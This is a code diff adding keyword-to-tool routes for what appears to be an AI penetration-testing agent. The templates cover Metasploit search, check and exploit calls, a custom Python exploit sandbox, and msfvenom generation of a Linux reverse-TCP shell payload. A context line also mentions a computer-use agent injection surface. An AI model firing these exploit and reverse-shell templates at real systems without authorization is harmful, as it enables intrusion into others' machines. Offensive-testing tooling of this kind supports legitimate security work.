@@ -6,6 +6,26 @@
 # (e.g. "token" which could match CSRF tokens). When ambiguous words
 # appear, use multi-word anchors like "csrf token" rather than bare "token".
 _MAPPINGS = [
+    # ----- W23-b: Metasploit Framework — operator quick-win for known CVEs -----
+    # Anchor to "msf" / "metasploit" / "cve exploit" so it wins before generic vuln keywords.
+    (["msf", "metasploit", "msfconsole", "msfvenom"], "msf_search",
+     "msf_search(query='log4shell')  # then msf_check(module, options={'RHOSTS':'...'}) "
+     "then msf_exploit(module, options={...}, require_check_first=True)"),
+    (["fire metasploit", "fire msf", "msf exploit", "fire exploit module",
+      "run msf exploit"], "msf_exploit",
+     "msf_exploit(module='exploit/multi/http/<...>', options={'RHOSTS':'10.0.0.1','LHOST':'...'}, require_check_first=True)"),
+    (["msf check", "verify with msf", "msf verify", "check exploitability"], "msf_check",
+     "msf_check(module='exploit/multi/http/<...>', options={'RHOSTS':'10.0.0.1'})"),
+    (["msfvenom", "generate shellcode", "encode payload", "msf payload"], "msf_payload_gen",
+     "msf_payload_gen(payload='linux/x64/shell_reverse_tcp', options={'LHOST':'...','LPORT':4444}, format='python')"),
+    # CVE-prefixed queries — route to MSF search by default (operator quick-win)
+    # When operator says "exploit CVE-2024-XXXX", check MSF first before crafting custom.
+    (["cve-2", "cve 2"], "msf_search",
+     "msf_search(query='CVE-2024-XXXXX')  # MSF has hundreds of CVE-tagged modules; check first before custom payload"),
+    # W23-a: Python exploit-dev sandbox (when no MSF module exists)
+    (["pyexploit", "py exploit", "python exploit", "custom poc",
+      "strix-style", "exploit sandbox", "burp-routed python"], "run_pyexploit",
+     "run_pyexploit(script='import requests\\nrequests.post(...)', timeout_s=30)"),
     # ----- W22 additions (placed first so specific keywords win over generic ones) -----
     # W22-b: Computer-Use Agent (CUA) injection surface
     (["cua", "computer-use", "computer use", "claude cua", "operator agent", "atlas browser",
